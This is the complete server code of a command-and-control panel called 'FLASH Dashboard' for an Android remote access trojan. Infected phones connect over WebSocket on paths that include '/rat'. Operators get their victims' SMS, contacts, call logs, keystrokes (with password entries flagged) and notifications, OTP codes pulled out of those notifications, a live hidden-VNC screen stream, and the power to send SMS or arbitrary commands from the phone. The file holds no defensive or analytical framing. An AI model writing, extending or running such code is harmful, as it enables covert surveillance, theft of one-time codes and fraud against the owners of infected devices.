'use strict';

require('dotenv').config();
const http   = require('http');
const https  = require('https');
const fs     = require('fs');
const express = require('express');
const { WebSocketServer, WebSocket } = require('ws');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

// ─── Config ──────────────────────────────────────────────────────────────────
const PORT       = process.env.PORT       || 3000;
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
const JWT_TTL    = '12h';

// ─── Database ─────────────────────────────────────────────────────────────────
const db = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : false,
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

db.on('error', err => console.error('[DB] pool error', err.message));

async function dbInit() {
  const fs = require('fs');
  const sql = fs.readFileSync(path.join(__dirname, 'schema.sql'), 'utf8');
  await db.query(sql);

  // Create default admin if no operators exist
  const { rowCount } = await db.query('SELECT 1 FROM operators LIMIT 1');
  if (rowCount === 0) {
    const hash = await bcrypt.hash(process.env.ADMIN_PASSWORD || 'flash2024', 12);
    await db.query(
      'INSERT INTO operators (username, password_hash) VALUES ($1, $2) ON CONFLICT DO NOTHING',
      [process.env.ADMIN_USER || 'admin', hash]
    );
    console.log('[INIT] Default admin created → admin / flash2024');
  }
}

// ─── App & Middleware ─────────────────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// ─── Auth Middleware ──────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
  const token = req.cookies?.token || req.headers.authorization?.replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try {
    req.operator = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

function verifyWsToken(token) {
  try { return jwt.verify(token, JWT_SECRET); } catch { return null; }
}

// ─── In-Memory Device & Operator Registry ────────────────────────────────────
// devices:   Map<deviceId, { ws, info, watchers: Set<operatorId> }>
// operators: Map<operatorId, { ws, watching: deviceId|null }>
const devices   = new Map();
const operators = new Map();

function broadcastDeviceList() {
  const list = [...devices.entries()].map(([id, d]) => ({
    id,
    alias:          d.info.alias || d.info.model || id,
    model:          d.info.model,
    androidVersion: d.info.androidVersion,
    manufacturer:   d.info.manufacturer,
    phoneNumber:    d.info.phoneNumber,
    batteryLevel:   d.info.batteryLevel,
    isRooted:       d.info.isRooted,
    carrier:        d.info.carrier,
    country:        d.info.country,
    online:         d.ws.readyState === WebSocket.OPEN,
    watchers:       d.watchers.size,
  }));

  const msg = JSON.stringify({ type: 'device_list', devices: list });
  for (const [, op] of operators) {
    if (op.ws.readyState === WebSocket.OPEN) op.ws.send(msg);
  }
}

function sendToDevice(deviceId, payload) {
  const dev = devices.get(deviceId);
  if (!dev || dev.ws.readyState !== WebSocket.OPEN) return false;
  const data = typeof payload === 'string' ? payload : JSON.stringify(payload);
  dev.ws.send(data);
  return true;
}

function relayToWatchers(deviceId, msg, isBinary = false) {
  const dev = devices.get(deviceId);
  if (!dev) return;
  for (const opId of dev.watchers) {
    const op = operators.get(opId);
    if (op?.ws.readyState === WebSocket.OPEN) {
      op.ws.send(msg, { binary: isBinary });
    }
  }
}

// ─── REST Auth Endpoints ──────────────────────────────────────────────────────
app.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });

  try {
    const { rows } = await db.query('SELECT * FROM operators WHERE username = $1', [username]);
    if (!rows.length) return res.status(401).json({ error: 'Invalid credentials' });

    const ok = await bcrypt.compare(password, rows[0].password_hash);
    if (!ok) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign({ id: rows[0].id, username: rows[0].username }, JWT_SECRET, { expiresIn: JWT_TTL });
    res
      .cookie('token', token, { httpOnly: true, sameSite: 'strict', maxAge: 43200000 })
      .json({ ok: true, token, username: rows[0].username });
  } catch (err) {
    console.error('[AUTH] login error:', err.message);
    res.status(500).json({ error: 'Internal error' });
  }
});

app.post('/auth/logout', (req, res) => {
  res.clearCookie('token').json({ ok: true });
});

app.get('/auth/me', requireAuth, (req, res) => {
  res.json({ username: req.operator.username });
});

// ─── REST API ─────────────────────────────────────────────────────────────────
app.get('/api/devices', requireAuth, async (req, res) => {
  try {
    const { rows } = await db.query('SELECT * FROM devices ORDER BY last_seen DESC');
    // Merge live online status
    const list = rows.map(r => ({ ...r, online: devices.has(r.id) && devices.get(r.id).ws.readyState === WebSocket.OPEN }));
    res.json(list);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id', requireAuth, async (req, res) => {
  try {
    const { rows } = await db.query('SELECT * FROM devices WHERE id = $1', [req.params.id]);
    if (!rows.length) return res.status(404).json({ error: 'Not found' });
    const dev = rows[0];
    dev.online = devices.has(dev.id) && devices.get(dev.id).ws.readyState === WebSocket.OPEN;
    res.json(dev);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/sms', requireAuth, async (req, res) => {
  try {
    const limit  = Math.min(parseInt(req.query.limit)  || 100, 500);
    const offset = parseInt(req.query.offset) || 0;
    const { rows } = await db.query(
      'SELECT * FROM sms WHERE device_id = $1 ORDER BY date DESC NULLS LAST LIMIT $2 OFFSET $3',
      [req.params.id, limit, offset]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/contacts', requireAuth, async (req, res) => {
  try {
    const { rows } = await db.query(
      'SELECT * FROM contacts WHERE device_id = $1 ORDER BY name',
      [req.params.id]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/calls', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    const { rows } = await db.query(
      'SELECT * FROM calls WHERE device_id = $1 ORDER BY date DESC NULLS LAST LIMIT $2',
      [req.params.id, limit]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/keylogs', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
    const { rows } = await db.query(
      'SELECT * FROM keylogs WHERE device_id = $1 ORDER BY received_at DESC LIMIT $2',
      [req.params.id, limit]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/notifications', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    const { rows } = await db.query(
      'SELECT * FROM notifications WHERE device_id = $1 ORDER BY post_time DESC NULLS LAST LIMIT $2',
      [req.params.id, limit]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Send SMS via REST (queues command to device)
app.post('/api/device/:id/send-sms', requireAuth, async (req, res) => {
  const { to, body } = req.body;
  if (!to || !body) return res.status(400).json({ error: 'Missing to or body' });
  const sent = sendToDevice(req.params.id, { action: 'SEND_SMS', phoneNo: to, smsText: body });
  res.json({ ok: sent, queued: !sent });
});

// Command shortcut REST endpoints
app.post('/api/device/:id/command', requireAuth, async (req, res) => {
  const sent = sendToDevice(req.params.id, req.body);
  res.json({ ok: sent });
});

// Update device alias
app.patch('/api/device/:id/alias', requireAuth, async (req, res) => {
  const { alias } = req.body;
  if (!alias) return res.status(400).json({ error: 'Missing alias' });
  try {
    await db.query('UPDATE devices SET alias = $1 WHERE id = $2', [alias, req.params.id]);
    // Notify all operators
    const dev = devices.get(req.params.id);
    if (dev) dev.info.alias = alias;
    broadcastDeviceList();
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── HTTP / HTTPS Server ──────────────────────────────────────────────────────
// If SSL_CERT and SSL_KEY env vars point to valid files, run HTTPS+WSS on PORT.
// Otherwise run plain HTTP+WS (use nginx/Cloudflare for TLS in front).
//
// Quick self-signed cert for testing:
//   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
//   SSL_CERT=cert.pem SSL_KEY=key.pem node server.js

let server;
const SSL_CERT = process.env.SSL_CERT;
const SSL_KEY  = process.env.SSL_KEY;
const USE_TLS  = SSL_CERT && SSL_KEY && fs.existsSync(SSL_CERT) && fs.existsSync(SSL_KEY);

if (USE_TLS) {
  const tlsOptions = {
    cert: fs.readFileSync(SSL_CERT),
    key:  fs.readFileSync(SSL_KEY),
  };
  server = https.createServer(tlsOptions, app);
  console.log('[TLS] HTTPS+WSS mode — cert:', SSL_CERT);
} else {
  server = http.createServer(app);
  console.log('[TLS] HTTP+WS mode (set SSL_CERT + SSL_KEY env vars for HTTPS/WSS)');
}

// ─── WebSocket Servers ────────────────────────────────────────────────────────
// Two separate WS servers sharing the same HTTP server via URL path routing.
//
// perMessageDeflate: false  — JPEG frames are already compressed; deflating them
//   burns CPU on both ends for zero byte savings and adds ~2-5ms latency per frame.
//   Critical for smooth HVNC. JSON control messages are tiny and don't need it either.
//
// maxPayload: 4MB           — headroom for high-res JPEG frames from modern devices.
const WS_OPTS = { noServer: true, perMessageDeflate: false, maxPayload: 4 * 1024 * 1024 };
const deviceWss    = new WebSocketServer(WS_OPTS);
const dashboardWss = new WebSocketServer(WS_OPTS);

server.on('upgrade', (req, socket, head) => {
  const url = req.url?.split('?')[0];

  // Accept device connections on multiple common APK endpoint paths
  const isDevicePath    = url === '/ws/device' || url === '/ws' || url === '/device'
                       || url === '/socket'    || url === '/connect' || url === '/rat';
  const isDashboardPath = url === '/ws/dashboard' || url === '/dashboard';

  if (isDevicePath) {
    deviceWss.handleUpgrade(req, socket, head, ws => deviceWss.emit('connection', ws, req));
  } else if (isDashboardPath) {
    dashboardWss.handleUpgrade(req, socket, head, ws => dashboardWss.emit('connection', ws, req));
  } else {
    console.warn(`[WS] Rejected unknown upgrade path: ${url}`);
    socket.destroy();
  }
});

// ─── Device WebSocket Handler ─────────────────────────────────────────────────
deviceWss.on('connection', (ws, req) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.socket.remoteAddress;

  let deviceId = null;

  ws.on('message', async (data, isBinary) => {
    // Binary → HVNC frame: [0x01][uint32 BE size][JPEG bytes]
    if (isBinary || Buffer.isBuffer(data)) {
      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
      if (buf.length >= 6 && buf[0] === 0x01) {
        // Frame valid: [0x01][uint32 BE size 4B][JPEG bytes ≥1B] — relay raw to watchers
        if (deviceId) relayToWatchers(deviceId, buf, true);
      } else if (buf.length > 0) {
        // Unknown binary — could be from a different APK binary protocol; log marker byte
        console.log(`[DEVICE] ${deviceId} unknown binary frame: marker=0x${buf[0].toString(16).padStart(2,'0')} len=${buf.length}`);
      }
      return;
    }

    // Text → JSON command/event
    let msg;
    try { msg = JSON.parse(data); } catch { return; }

    // ── Device registration ──────────────────────────────────────────────────
    // Accept many possible registration type names from different APK builds
    const isRegister =
      msg.type   === 'register'   || msg.type   === 'REGISTER'   ||
      msg.type   === 'init'       || msg.type   === 'INIT'        ||
      msg.type   === 'hello'      || msg.type   === 'connect'     ||
      msg.action === 'REGISTER'   || msg.action === 'register'    ||
      msg.action === 'CONNECT'    || msg.event  === 'register'    ||
      // Auto-detect: first message that looks like device info (no type field or unrecognised type)
      (!deviceId && !msg.type && !msg.action && (msg.model || msg.manufacturer || msg.deviceModel));

    if (isRegister) {
      // Accept device_id / uid / imei / serialNo as well as deviceId / id
      deviceId = msg.deviceId || msg.device_id || msg.id || msg.uid
              || msg.imei    || msg.serialNo   || msg.serial || crypto.randomUUID();

      const info = {
        alias:          null,
        model:          msg.model          || msg.deviceModel      || msg.device_model || null,
        androidVersion: msg.androidVersion || msg.android_version  || msg.osVersion    || null,
        manufacturer:   msg.manufacturer   || msg.brand            || null,
        phoneNumber:    msg.phoneNumber    || msg.phone_number      || msg.phone        || null,
        batteryLevel:   msg.batteryLevel   || msg.battery_level    || null,
        isRooted:       !!(msg.isRooted    || msg.is_rooted        || msg.rooted),
        carrier:        msg.carrier        || msg.operator         || null,
        country:        msg.country        || msg.locale           || null,
        wifiSsid:       msg.wifiSsid       || msg.wifi_ssid        || msg.ssid         || null,
        permissions:    msg.permissions                            || {},
        ip,
      };

      // Check DB for existing alias
      try {
        const existing = await db.query('SELECT alias FROM devices WHERE id = $1', [deviceId]);
        if (existing.rows.length) info.alias = existing.rows[0].alias;
      } catch {}

      devices.set(deviceId, { ws, info, watchers: new Set() });

      // Upsert device in DB
      db.query(`
        INSERT INTO devices (id, model, android_version, manufacturer, phone_number,
          battery_level, is_rooted, carrier, country, wifi_ssid, permissions, ip_address, is_online, last_seen)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,TRUE,NOW())
        ON CONFLICT (id) DO UPDATE SET
          model = EXCLUDED.model, android_version = EXCLUDED.android_version,
          manufacturer = EXCLUDED.manufacturer, phone_number = EXCLUDED.phone_number,
          battery_level = EXCLUDED.battery_level, is_rooted = EXCLUDED.is_rooted,
          carrier = EXCLUDED.carrier, country = EXCLUDED.country,
          wifi_ssid = EXCLUDED.wifi_ssid, permissions = EXCLUDED.permissions,
          ip_address = EXCLUDED.ip_address, is_online = TRUE, last_seen = NOW()
      `, [deviceId, info.model, info.androidVersion, info.manufacturer, info.phoneNumber,
          info.batteryLevel, info.isRooted, info.carrier, info.country, info.wifiSsid,
          JSON.stringify(info.permissions), ip]).catch(console.error);

      // Send ack
      ws.send(JSON.stringify({ type: 'registered', deviceId }));
      broadcastDeviceList();
      console.log(`[DEVICE] +++ ${deviceId} (${info.model || 'unknown'}) from ${ip}`);
      return;
    }

    if (!deviceId) return; // ignore unregistered

    // Update last_seen
    db.query('UPDATE devices SET last_seen = NOW() WHERE id = $1', [deviceId]).catch(() => {});

    // ── Data events from device ──────────────────────────────────────────────
    const type = msg.type || msg.event;

    switch (type) {

      case 'sms':
      case 'SMS': {
        const list = msg.smsList || msg.list || msg.data || [];
        if (!list.length) break;
        // Parameterized bulk insert — eliminates SQL injection and $$ dollar-quote breakage
        const p1 = list.map(() => deviceId);
        const p2 = list.map(s => String(s.id || s.sms_id || ''));
        const p3 = list.map(s => s.address  || null);
        const p4 = list.map(s => s.body     || null);
        const p5 = list.map(s => s.date     != null ? Number(s.date)     : null);
        const p6 = list.map(s => s.type     != null ? Number(s.type)     : 0);
        const p7 = list.map(s => !!(s.read  || s.is_read));
        db.query(
          `INSERT INTO sms (device_id,sms_id,address,body,date,type,is_read)
           SELECT * FROM unnest($1::text[],$2::text[],$3::text[],$4::text[],$5::bigint[],$6::int[],$7::bool[])
           AS t(device_id,sms_id,address,body,date,type,is_read)
           ON CONFLICT DO NOTHING`,
          [p1, p2, p3, p4, p5, p6, p7]
        ).catch(console.error);
        break;
      }

      case 'contacts':
      case 'CONTACTS': {
        const list = msg.contactsList || msg.list || msg.data || [];
        if (!list.length) break;
        const p1 = list.map(() => deviceId);
        const p2 = list.map(c => String(c.id || c.contact_id || ''));
        const p3 = list.map(c => c.name        || null);
        const p4 = list.map(c => c.phoneNumber || c.phone || null);
        const p5 = list.map(c => c.email       || null);
        db.query(
          `INSERT INTO contacts (device_id,contact_id,name,phone,email)
           SELECT * FROM unnest($1::text[],$2::text[],$3::text[],$4::text[],$5::text[])
           AS t(device_id,contact_id,name,phone,email)
           ON CONFLICT DO NOTHING`,
          [p1, p2, p3, p4, p5]
        ).catch(console.error);
        break;
      }

      case 'calls':
      case 'CALLS': {
        const list = msg.callsList || msg.list || msg.data || [];
        if (!list.length) break;
        const p1 = list.map(() => deviceId);
        const p2 = list.map(c => String(c.id || c.call_id || ''));
        const p3 = list.map(c => c.number    || c.phoneNo || null);
        const p4 = list.map(c => c.name      || null);
        const p5 = list.map(c => c.duration  != null ? Number(c.duration) : 0);
        const p6 = list.map(c => c.date      != null ? Number(c.date)     : null);
        const p7 = list.map(c => c.type      != null ? Number(c.type)     : 0);
        db.query(
          `INSERT INTO calls (device_id,call_id,number,name,duration,date,type)
           SELECT * FROM unnest($1::text[],$2::text[],$3::text[],$4::text[],$5::int[],$6::bigint[],$7::int[])
           AS t(device_id,call_id,number,name,duration,date,type)
           ON CONFLICT DO NOTHING`,
          [p1, p2, p3, p4, p5, p6, p7]
        ).catch(console.error);
        break;
      }

      case 'keylog':
      case 'KEYLOG':
      case 'keylogger':
      case 'keystroke': {
        const entries = Array.isArray(msg.data) ? msg.data
                      : Array.isArray(msg.list)  ? msg.list
                      : [msg];
        for (const e of entries) {
          db.query(
            'INSERT INTO keylogs (device_id,app_name,package_name,text,is_password,timestamp) VALUES ($1,$2,$3,$4,$5,$6)',
            [deviceId,
             e.appName || e.app_name || e.application || null,
             e.packageName || e.package_name || e.pkg || null,
             e.text || e.key || e.keys || null,
             !!(e.isPassword || e.is_password || e.password),
             e.timestamp || e.time || Date.now()]
          ).catch(console.error);
        }
        break;
      }

      case 'notification':
      case 'NOTIFICATION':
      case 'notif': {
        const n = msg.data || msg;
        const otp = extractOtp(n.body || n.text || n.content || '');
        db.query(
          'INSERT INTO notifications (device_id,package_name,title,body,is_otp,otp_code,post_time) VALUES ($1,$2,$3,$4,$5,$6,$7)',
          [deviceId,
           n.packageName || n.package_name || n.pkg || null,
           n.title || null,
           n.body || n.text || n.content || null,
           !!otp, otp,
           n.postTime || n.post_time || n.time || Date.now()]
        ).catch(console.error);
        break;
      }

      case 'device_info':
      case 'DEVICE_INFO':
      case 'deviceInfo':
      case 'battery':
      case 'status': {
        const info = msg.data || msg;
        const battery = info.batteryLevel ?? info.battery_level ?? info.battery ?? null;
        const ssid    = info.wifiSsid     || info.wifi_ssid     || info.ssid    || null;
        const carrier = info.carrier      || info.operator      || null;
        db.query(`UPDATE devices SET battery_level=$1, wifi_ssid=$2, carrier=$3, is_online=TRUE, last_seen=NOW() WHERE id=$4`,
          [battery, ssid, carrier, deviceId]).catch(console.error);
        const dev = devices.get(deviceId);
        if (dev) {
          if (battery  != null) dev.info.batteryLevel = battery;
          if (carrier)          dev.info.carrier      = carrier;
          if (ssid)             dev.info.wifiSsid     = ssid;
        }
        broadcastDeviceList();
        break;
      }

      default: {
        // Log unrecognised event types — useful for diagnosing APK protocol mismatches
        if (type) console.log(`[DEVICE] ${deviceId} unrecognised event type: ${type}`, Object.keys(msg));
      }
    }

    // Always relay JSON events to watching operators
    relayToWatchers(deviceId, JSON.stringify({ ...msg, _deviceId: deviceId }));
  });

  ws.on('close', () => {
    if (!deviceId) return;
    const dev = devices.get(deviceId);
    if (dev) {
      // Notify watchers
      for (const opId of dev.watchers) {
        const op = operators.get(opId);
        if (op?.ws.readyState === WebSocket.OPEN) {
          op.ws.send(JSON.stringify({ type: 'device_offline', deviceId }));
        }
      }
    }
    devices.delete(deviceId);
    db.query('UPDATE devices SET is_online=FALSE WHERE id=$1', [deviceId]).catch(() => {});
    broadcastDeviceList();
    console.log(`[DEVICE] --- ${deviceId}`);
  });

  ws.on('error', err => console.error(`[DEVICE] ${deviceId} error:`, err.message));

  // Heartbeat — initialised here (not in a second connection listener)
  ws._alive = true;
  ws.on('pong', () => { ws._alive = true; });
});

// ─── Dashboard WebSocket Handler ──────────────────────────────────────────────
dashboardWss.on('connection', (ws, req) => {
  // Extract token from query string or cookie header
  const urlParams = new URLSearchParams(req.url?.split('?')[1] || '');
  const rawCookie = req.headers.cookie || '';
  const cookieToken = rawCookie.match(/(?:^|;\s*)token=([^;]+)/)?.[1];
  const token = urlParams.get('token') || cookieToken;

  const operator = verifyWsToken(token);
  if (!operator) {
    ws.send(JSON.stringify({ type: 'error', message: 'Unauthorized' }));
    ws.close(1008, 'Unauthorized');
    return;
  }

  const opId = `op_${operator.id}_${Date.now()}`;
  operators.set(opId, { ws, watching: null, username: operator.username });
  console.log(`[OP] +++ ${operator.username} (${opId})`);

  // Send current device list immediately
  const list = [...devices.entries()].map(([id, d]) => ({
    id,
    alias:          d.info.alias || d.info.model || id,
    model:          d.info.model,
    androidVersion: d.info.androidVersion,
    manufacturer:   d.info.manufacturer,
    phoneNumber:    d.info.phoneNumber,
    batteryLevel:   d.info.batteryLevel,
    isRooted:       d.info.isRooted,
    carrier:        d.info.carrier,
    country:        d.info.country,
    online:         d.ws.readyState === WebSocket.OPEN,
    watchers:       d.watchers.size,
  }));
  ws.send(JSON.stringify({ type: 'device_list', devices: list }));

  ws.on('message', data => {
    let msg;
    try { msg = JSON.parse(data); } catch { return; }

    const op = operators.get(opId);

    switch (msg.type) {

      case 'watch': {
        // Start watching a device
        const targetId = msg.deviceId;
        // Unwatch previous
        if (op.watching && op.watching !== targetId) {
          devices.get(op.watching)?.watchers.delete(opId);
        }
        const dev = devices.get(targetId);
        if (!dev) {
          ws.send(JSON.stringify({ type: 'error', message: 'Device not found or offline' }));
          break;
        }
        op.watching = targetId;
        dev.watchers.add(opId);
        ws.send(JSON.stringify({ type: 'watching', deviceId: targetId }));
        broadcastDeviceList();
        break;
      }

      case 'unwatch': {
        if (op.watching) {
          devices.get(op.watching)?.watchers.delete(opId);
          op.watching = null;
          broadcastDeviceList();
        }
        break;
      }

      case 'command': {
        // Forward command to target device
        const targetId = msg.deviceId || op.watching;
        if (!targetId) {
          ws.send(JSON.stringify({ type: 'error', message: 'No device targeted' }));
          break;
        }
        const { type: _, deviceId: __, ...cmdPayload } = msg;
        const sent = sendToDevice(targetId, cmdPayload);
        ws.send(JSON.stringify({ type: 'command_ack', sent, cmd: cmdPayload.action || cmdPayload.cmd }));
        break;
      }

      case 'ping':
        ws.send(JSON.stringify({ type: 'pong', t: Date.now() }));
        break;
    }
  });

  ws.on('close', () => {
    const op = operators.get(opId);
    if (op?.watching) {
      devices.get(op.watching)?.watchers.delete(opId);
    }
    operators.delete(opId);
    broadcastDeviceList();
    console.log(`[OP] --- ${operator.username}`);
  });

  ws.on('error', err => console.error(`[OP] ${opId} error:`, err.message));

  // Heartbeat
  ws._alive = true;
  ws.on('pong', () => { ws._alive = true; });
});

// ─── Helpers ──────────────────────────────────────────────────────────────────
function extractOtp(text) {
  const m = text.match(/\b(\d{4,8})\b/);
  return m ? m[1] : null;
}

// ─── Native WS ping/pong heartbeat ───────────────────────────────────────────
// Uses the WebSocket protocol-level ping frame (not JSON), which the OS TCP
// stack acknowledges without waking app-level code on the device.
// Runs every 10s — fast enough to detect dead sockets within one VNC session.
// _alive flag and pong handler are registered inside each connection handler above.

setInterval(() => {
  // Prune dead device sockets
  for (const [id, dev] of devices) {
    if (dev.ws._alive === false) {
      dev.ws.terminate();
      devices.delete(id);
      db.query('UPDATE devices SET is_online=FALSE WHERE id=$1', [id]).catch(() => {});
      broadcastDeviceList();
      continue;
    }
    dev.ws._alive = false;
    if (dev.ws.readyState === WebSocket.OPEN) dev.ws.ping();
  }
  // Prune dead operator sockets
  for (const [id, op] of operators) {
    if (op.ws._alive === false) {
      op.ws.terminate();
      operators.delete(id);
      continue;
    }
    op.ws._alive = false;
    if (op.ws.readyState === WebSocket.OPEN) op.ws.ping();
  }
}, 10000);

// ─── Start ────────────────────────────────────────────────────────────────────
dbInit()
  .then(() => {
    server.listen(PORT, () => {
      const proto  = USE_TLS ? 'wss' : 'ws';
      const hproto = USE_TLS ? 'https' : 'http';
      console.log(`\n╔══════════════════════════════════════╗`);
      console.log(`║   FLASH Dashboard  →  :${PORT}         ║`);
      console.log(`╚══════════════════════════════════════╝\n`);
      console.log(`  Device WS   ${proto}://host:${PORT}/ws/device  (also /ws, /device, /socket, /connect, /rat)`);
      console.log(`  Operator WS ${proto}://host:${PORT}/ws/dashboard`);
      console.log(`  Dashboard   ${hproto}://host:${PORT}\n`);
    });
  })
  .catch(err => {
    console.error('[FATAL] DB init failed:', err.message);
    process.exit(1);
  });
